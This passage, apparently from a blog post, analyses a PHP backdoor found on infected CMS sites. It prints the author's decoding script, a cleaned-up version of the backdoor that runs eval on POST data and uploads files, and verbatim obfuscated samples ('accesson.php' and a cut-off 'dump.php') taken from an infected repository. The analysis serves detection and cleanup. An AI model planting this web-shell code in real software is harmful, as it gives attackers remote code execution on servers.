+	<span class="k">echo</span> <span class="mi">7457737</span><span class="o">+</span><span class="mi">736723</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// 8194460 some sort of identification I'm sure.</span>
+	<span class="nv">$raPo_rZluoE</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">122</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"T"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="s2">"R"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"9"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">107</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)</span>  <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span> <span class="p">;</span> <span class="c1">// base64_decode</span>
+	<span class="k">echo</span> <span class="nv">$raPo_rZluoE</span><span class="p">;</span> <span class="c1">// Figure out what the first string says</span>
+	<span class="nv">$ydSJPtnwrSv</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">57</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)</span>  <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="c1">// eval($raPo_rZluoE($_POST[base64_decode(chr(97).chr(87)."Q".chr(61))]));</span>
+	<span class="k">echo</span> <span class="nv">$ydSJPtnwrSv</span><span class="p">;</span> <span class="c1">// figure out what the second string says</span>
+	<span class="nv">$post_string</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))</span>  <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="c1">// The name of the POST being sent to eval()</span>
+	<span class="k">echo</span> <span class="nv">$post_string</span><span class="p">;</span> <span class="c1">// let's see the post string</span>
+	<span class="cm">/*
+	Yean... don't run this.
+	if( $_POST[base64_decode("d".chr(88).chr(65)."=")] == base64_decode("d"."X".chr(65).chr(61))) {
+
+		@$ydSJPtnwrSv($_FILES[base64_decode(chr(90)."m"."l"."s".chr(90)."Q"."=".chr(61))][base64_decode(chr(100).chr(71).chr(49)."w"."X".chr(50)."5".chr(104)."b".chr(87)."U".chr(61))],$_FILES[base64_decode("Z".chr(109)."l"."s".chr(90)."Q".chr(61).chr(61))][base64_decode(chr(98)."m"."F".chr(116)."Z".chr(81).chr(61)."=")]);
+	}
+	*/</span>
+	<span class="nv">$post_string_2</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$post_string_2</span><span class="p">;</span> <span class="c1">// lets see the second post string</span>
+	<span class="nv">$post_string_3</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))</span>  <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$post_string_3</span><span class="p">;</span> <span class="c1">// lets see the third post string (the comparison)</span>
+	<span class="nv">$file_name_1</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))</span>  <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$file_name_1</span><span class="p">;</span>
+	<span class="nv">$file_name_2</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="mf">.</span><span class="s2">"w"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"5"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span><span class="mf">.</span><span class="s2">"b"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"U"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))</span>  <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$file_name_2</span><span class="p">;</span>
+	<span class="nv">$file_name_3</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))</span>  <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$file_name_1</span><span class="p">;</span>
+	<span class="nv">$file_name_4</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nv">$file_name_1</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Here’s what we see when we run our janky little decoder.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/Lab$ php ./test.php
+8194460
+base64_decode
+copy
+id
+up
+up
+file
+tmp_name
+file
+file
+</code></pre></div></div>
+
+<h4 id="step-3-deobfuscated-script">Step 3: Deobfuscated Script</h4>
+<p>Reading our decoder’s printout from the top down, it’s pretty easy to replace the obfuscated strings with our deobfuscated strings. After doing so, here’s what we wind up with. The whole script is rather short compared to all the initial gibberish.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+	<span class="k">echo</span> <span class="mi">7457737</span><span class="o">+</span><span class="mi">736723</span><span class="p">;</span> <span class="c1">// Still probably an id of some sort.</span>
+	<span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">((</span><span class="nv">$_POST</span><span class="p">[</span><span class="n">id</span><span class="p">]));</span> <span class="c1">// Decodes POST['id'], that becomes the file name given to the eval() function.</span>
+	<span class="c1">// Probably an 'all good' response from the remote server.</span>
+	<span class="k">if</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'up'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'up'</span><span class="p">)</span> <span class="p">{</span>
+		<span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span> <span class="c1">// Malicious files from remote server copied to host.</span>
+	<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>It doesn’t tell us a whole lot about what the malware actually does on the victims system, because all we can see is that there’s a remote server copying and executing files. What you can tell though, is that if this was on your server, you’d absolutely need to be looking for other malicious files, because this was there to facilitate their transfer.</p>
+
+<h4 id="going-further">Going Further</h4>
+<p>This code looks like it infected a lot of PHP applications out in the wild. A simple <a href="https://www.google.com/search?q=echo+7457737%2B736723%3B&amp;oq=echo+7457737%2B736723%3B&amp;aqs=chrome..69i57.230j0j7&amp;client=ubuntu&amp;sourceid=chrome&amp;ie=UTF-8">Google query</a> for <code class="highlighter-rouge">echo 7457737+736723;</code> reveals many WordPress, Drupal, OpenCart, and various other PHP applications infected. It’s likely installed via an infected plugin built for any of those systems, vulnerabilities in them, or issues with the hosts on which they’re running.</p>
+
+<p>Through a search for the code on GitHub I was able to find an infected Russian store. Within <a href="https://github.com/neovo/feoro.ru/blob/master/docs/assets/images/on.php">their repository</a> there is a file titled <code class="highlighter-rouge">on.php</code> which simply contains <code class="highlighter-rouge"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="mi">7457737</span><span class="o">+</span><span class="mi">736723</span><span class="p">;</span><span class="cp">?&gt;</span></code>. I presume this signifies that the host is infected successfully, and that PHP is running. After searching through their commit log I can see that the directory once contained additional obfuscated files.</p>
+
+<p><strong>accesson.php</strong></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="mi">7457737</span><span class="o">+</span><span class="mi">736723</span><span class="p">;</span><span class="nv">$raPo_rZluoE</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">122</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"T"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="s2">"R"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"Y"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"9"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">107</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="s2">"="</span><span class="p">);</span><span class="nv">$ydSJPtnwrSv</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">89</span><span class="p">)</span><span class="mf">.</span><span class="s2">"2"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">57</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">119</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">101</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">);</span><span class="k">eval</span><span class="p">(</span><span class="nv">$raPo_rZluoE</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))]));</span><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">88</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)]</span> <span class="o">==</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"d"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))){</span><span class="o">@</span><span class="nv">$ydSJPtnwrSv</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="s2">"="</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))][</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="mf">.</span><span class="s2">"w"</span><span class="mf">.</span><span class="s2">"X"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="mf">.</span><span class="s2">"5"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">104</span><span class="p">)</span><span class="mf">.</span><span class="s2">"b"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span><span class="mf">.</span><span class="s2">"U"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))],</span><span class="nv">$_FILES</span><span class="p">[</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">109</span><span class="p">)</span><span class="mf">.</span><span class="s2">"l"</span><span class="mf">.</span><span class="s2">"s"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">90</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Q"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">))][</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mi">98</span><span class="p">)</span><span class="mf">.</span><span class="s2">"m"</span><span class="mf">.</span><span class="s2">"F"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">116</span><span class="p">)</span><span class="mf">.</span><span class="s2">"Z"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">81</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="mf">.</span><span class="s2">"="</span><span class="p">)]);};</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>dump.php</strong></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">B</span><span class="se">\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"s</span><span class="se">\x70\x72\x62\x77</span><span class="s2">l</span><span class="se">\x6f</span><span class="s2">i"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6f\x75</span><span class="s2">t_</span><span class="se">\x64\x61\x74\x61</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"w</span><span class="se">\x64</span><span class="s2">k</span><span class="se">\x71</span><span class="s2">e</span><span class="se">\x67\x62</span><span class="s2">t</span><span class="se">\x73</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6b\x65\x79\x33</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x72\x65\x64\x73</span><span class="s2">ob</span><span class="se">\x64\x67\x66\x77</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6b\x65\x79\x32</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x63</span><span class="s2">x</span><span class="se">\x76</span><span class="s2">t</span><span class="se">\x73\x72\x63\x77</span><span class="s2">r"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6e</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f</span><span class="s2">BAL</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"ud</span><span class="se">\x77\x77\x78</span><span class="s2">e</span><span class="se">\x69\x6e\x6a</span><span class="s2">s"</span><span class="p">]</span><span class="o">=</span><span class="s2">"c"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f</span><span class="s2">B</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"ct</span><span class="se">\x78\x67\x76</span><span class="s2">qg</span><span class="se">\x6c</span><span class="s2">vo</span><span class="se">\x67</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x70</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">j</span><span class="se">\x68</span><span class="s2">y</span><span class="se">\x77\x6e\x68</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42</span><span class="s2">ALS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x72</span><span class="s2">d</span><span class="se">\x68</span><span class="s2">ii</span><span class="se">\x76\x67\x72\x6d</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x62</span><span class="s2">a</span><span class="se">\x73\x65</span><span class="s2">6</span><span class="se">\x34\x69\x6e</span><span class="s2">v"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f\x69\x6d\x66\x77</span><span class="s2">p</span><span class="se">\x62</span><span class="s2">v</span><span class="se">\x73</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"i"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x78\x65\x66</span><span class="s2">ud</span><span class="se">\x77\x65\x6b\x71\x78\x72</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"b</span><span class="se">\x61</span><span class="s2">s</span><span class="se">\x65\x36\x34\x63\x68\x61</span><span class="s2">r</span><span class="se">\x73</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">LO</span><span class="se">\x42\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6a\x6b</span><span class="s2">oz</span><span class="se">\x74\x6f\x67\x6b</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x64</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6a\x66</span><span class="s2">du</span><span class="se">\x62\x66\x73</span><span class="s2">y"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x61</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42</span><span class="s2">AL</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x70\x70\x6d\x75\x79\x76</span><span class="s2">i"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x72</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x66</span><span class="s2">km</span><span class="se">\x79\x71\x65\x78</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x61\x6b</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">LOB</span><span class="se">\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6e\x76\x69\x71\x70\x68\x6c</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"da</span><span class="se">\x74\x61</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"q</span><span class="se">\x6c\x79\x6d\x6f\x6b\x66</span><span class="s2">zoe"</span><span class="p">]</span><span class="o">=</span><span class="s2">"key"</span><span class="p">;</span><span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">"</span><span class="se">\x65\x72\x72\x6f\x72</span><span class="s2">_l</span><span class="se">\x6f</span><span class="s2">g"</span><span class="p">,</span><span class="kc">NULL</span><span class="p">);</span><span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">"</span><span class="se">\x6c\x6f</span><span class="s2">g</span><span class="se">\x5f\x65</span><span class="s2">rr</span><span class="se">\x6f</span><span class="s2">r</span><span class="se">\x73</span><span class="s2">"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">"</span><span class="se">\x6d\x61\x78</span><span class="s2">_</span><span class="se">\x65</span><span class="s2">x</span><span class="se">\x65\x63</span><span class="s2">u</span><span class="se">\x74\x69\x6f\x6e</span><span class="s2">_</span><span class="se">\x74\x69</span><span class="s2">m</span><span class="se">\x65</span><span class="s2">"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="nb">array_walk</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">,</span><span class="s2">"e</span><span class="se">\x6e</span><span class="s2">u</span><span class="se">\x6d\x65</span><span class="s2">r</span><span class="se">\x61\x74</span><span class="s2">o</span><span class="se">\x72</span><span class="s2">"</span><span class="p">);</span><span class="nb">array_walk</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">,</span><span class="s2">"</span><span class="se">\x65</span><span class="s2">nu</span><span class="se">\x6d\x65</span><span class="s2">rator"</span><span class="p">);</span><span class="k">function</span> <span class="n">enumerator</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$key</span><span class="p">){</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OB</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x77</span><span class="s2">b</span><span class="se">\x6e\x72\x64\x66</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"d</span><span class="se">\x61</span><span class="s2">ta"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"x</span><span class="se">\x76\x73\x77\x6d\x74\x76\x79</span><span class="s2">o</span><span class="se">\x64</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x76</span><span class="s2">a</span><span class="se">\x6c\x75</span><span class="s2">e"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"w</span><span class="se">\x62\x6e</span><span class="s2">rd</span><span class="se">\x66</span><span class="s2">"</span><span class="p">]}</span><span class="o">=@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nf">decode</span><span class="p">(</span><span class="nf">get_params</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GLO</span><span class="se">\x42</span><span class="s2">AL</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x78\x76\x73\x77\x6d\x74\x76\x79</span><span class="s2">od"</span><span class="p">]}),</span><span class="err">$</span><span class="p">{</span><span 